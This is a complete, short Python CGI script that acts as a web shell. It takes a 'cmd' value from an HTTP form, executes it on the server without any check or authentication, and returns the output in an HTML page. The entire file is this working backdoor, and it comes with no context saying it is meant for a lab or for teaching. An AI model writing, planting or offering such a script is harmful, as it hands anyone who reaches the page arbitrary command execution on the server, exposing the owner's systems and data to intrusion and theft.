#!/usr/bin/python3

import subprocess
import cgi

print("Content-Type: text/html")
print()

form = cgi.FieldStorage()

if "cmd" in form:
    command = form["cmd"].value
    try:
        output = subprocess.getoutput(command)
        print("Command output:")
        print("<pre>")
        print(output)
        print("</pre>")
    except Exception as e:
        print("Error:", str(e))
else:
    print("No command provided.")

